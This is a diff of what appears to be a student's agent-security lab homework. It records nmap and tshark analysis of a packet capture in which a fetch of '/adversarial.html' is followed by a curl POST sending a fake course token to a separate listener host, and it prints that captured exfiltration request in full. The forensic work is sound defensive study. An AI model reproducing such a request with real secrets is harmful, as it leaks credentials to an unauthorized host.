@@ -97,4 +97,100 @@ CSCE465-FAKE-TOKEN-e8e56b9e4c164afc
 Explain what each container represents in the incident:
 
 
+Task 2:
 
+Scan Output:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ sudo nmap -sT -p 9009 172.30.0.10
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-18 19:34 CST
+Nmap scan report for 172.30.0.10
+Host is up (0.00016s latency).
+
+PORT     STATE SERVICE
+9009/tcp open  pichat
+MAC Address: 8E:1A:31:80:08:C6 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds
+
+
+Reconstruction Items:
+Source & Destination IP Addresses & Ports:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ tshark -r /hw4-malicious.pcap -T fields -e ip.src -e ip.dst -e tcp.port
+172.30.0.10	172.30.0.40	36564,8000
+172.30.0.40	172.30.0.10	8000,36564
+172.30.0.10	172.30.0.40	36564,8000
+172.30.0.10	172.30.0.40	36564,8000
+172.30.0.40	172.30.0.10	8000,36564
+172.30.0.40	172.30.0.10	8000,36564
+172.30.0.10	172.30.0.40	36564,8000
+172.30.0.40	172.30.0.10	8000,36564
+172.30.0.10	172.30.0.40	36564,8000
+172.30.0.40	172.30.0.10	8000,36564
+172.30.0.10	172.30.0.40	36564,8000
+172.30.0.40	172.30.0.10	8000,36564
+172.30.0.10	172.30.0.66	46818,8080
+172.30.0.66	172.30.0.10	8080,46818
+172.30.0.10	172.30.0.66	46818,8080
+172.30.0.10	172.30.0.66	46818,8080
+172.30.0.66	172.30.0.10	8080,46818
+172.30.0.66	172.30.0.10	8080,46818
+172.30.0.10	172.30.0.66	46818,8080
+172.30.0.10	172.30.0.66	46818,8080
+172.30.0.66	172.30.0.10	8080,46818
+172.30.0.10	172.30.0.66	46818,8080
+		
+HTTP Method and URI:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ tshark -r /hw4-malicious.pcap -T fields -e http.request.method -e http.request.uri
+GET	/adversarial.html	
+POST	/
+
+Fake Token & SHA-256 Hash of exact POST body bytes:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ tshark -r /hw4-malicious.pcap -q -z follow,tcp,ascii,1
+
+===================================================================
+Follow: tcp,ascii
+Filter: tcp.stream eq 1
+Node 0: 172.30.0.10:46818
+Node 1: 172.30.0.66:8080
+176
+POST / HTTP/1.1
+Host: 172.30.0.66:8080
+User-Agent: curl/8.14.1
+Accept: */*
+Content-Type: application/octet-stream
+Content-Length: 35
+
+CSCE465-FAKE-TOKEN-e8e56b9e4c164afc
+	101
+HTTP/1.0 204 No Content
+Server: BaseHTTP/0.6 Python/3.12.16
+Date: Thu, 19 Nov 2026 01:36:00 GMT
+
+
+===================================================================
+
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ tshark -r /hw4-malicious.pcap -Y "http.request.method eq POST" -T fields -e http.file_data
+435343453436352d46414b452d544f4b454e2d65386535366239653463313634616663
+
+TCP stream number:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ tshark -r /hw4-malicious.pcap -T fields -e tcp.stream | sort -nu
+0
+1
+
+First & Last packet timestamps of exfiltration TCP stream:
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ tshark -r /hw4-malicious.pcap -Y "tcp.stream eq 1" -t ad | sed -n '1p;$p'
+   13 2026-11-18 19:35:59.891997  172.30.0.10 → 172.30.0.66  TCP 74 46818 → 8080 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM TSval=1054801933 TSecr=0 WS=1024
+   22 2026-11-18 19:36:00.029814  172.30.0.10 → 172.30.0.66  TCP 66 46818 → 8080 [ACK] Seq=178 Ack=103 Win=64512 Len=0 TSval=1054802071 TSecr=2321094216
+
+Evidence unauthorized listener was separate from expected web and C2 services
+melissa-ordonez@melissa-ordonez-VirtualBox:~/.openclaw/workspace/Documents/csce465-agentsec/hw4$ tshark -r /hw4-malicious.pcap -q -z conv,tcp
+================================================================================
+TCP Conversations
+Filter:<No Filter>
+                                                           |       <-      | |       ->      | |     Total     |    Relative    |   Duration   |
+                                                           | Frames  Bytes | | Frames  Bytes | | Frames  Bytes |      Start     |              |
+172.30.0.10:36564          <-> 172.30.0.40:8000                 6 910 bytes       6 500 bytes      12 1,410 bytes     0.000000000         0.0146
+172.30.0.10:46818          <-> 172.30.0.66:8080                 4 373 bytes       6 580 bytes      10 953 bytes     4.565241000         0.1378
+================================================================================
+
+
+Describe Sequence of Events:
